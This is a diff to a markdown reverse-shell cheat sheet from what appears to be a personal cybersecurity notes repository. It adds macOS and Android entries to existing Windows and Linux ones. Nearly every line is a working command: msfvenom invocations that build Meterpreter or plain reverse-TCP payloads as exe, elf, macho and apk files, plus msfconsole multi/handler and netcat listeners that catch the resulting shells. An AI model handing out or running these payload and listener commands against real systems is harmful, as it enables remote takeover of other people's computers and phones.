@@ -4,7 +4,7 @@ Documenting my journey in the world of CyberSecurity
 
 
 
-##  Reverse Conneciton Cheat Sheet
+##  Reverse Conneciton 
 
 ### Meterpreter
 **Windows**
@@ -17,7 +17,8 @@ MSFConsole Listener
 ```bash
 msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
 ```
-**Linux**
+**Linux**  
+
 MSFVenom Payload
 ```bash
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf > payload.elf
@@ -26,9 +27,35 @@ MSFConsole Listener
 ```bash
 msfconsole -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
 ```
+
+**MACOS**
+
+MSFVenom Payload
+```bash
+msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f macho > payload.macho
+```
+
+MSFConsole Listener
+```
+msfconsole -x "use exploit/multi/handler; set payload osx/x64/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
+```
+
+**Android**  
+
+MSFVenom Payload
+```
+msfvenom -p android/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -o payload.apk
+```
+
+MSFConsole Listener
+```
+msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST <Your_IP>; set LPORT <Your_Port>; exploit"
+```
+
 ### Netcat
 
-**Windows**
+**Windows** 
+
 MSFVenom Payload
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > payload.exe
@@ -38,6 +65,7 @@ Netcat Listener
 nc -lvp <Your_Port>
 ```
 **Linux**
+ 
 MSFVenom Payload
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf > payload.elf
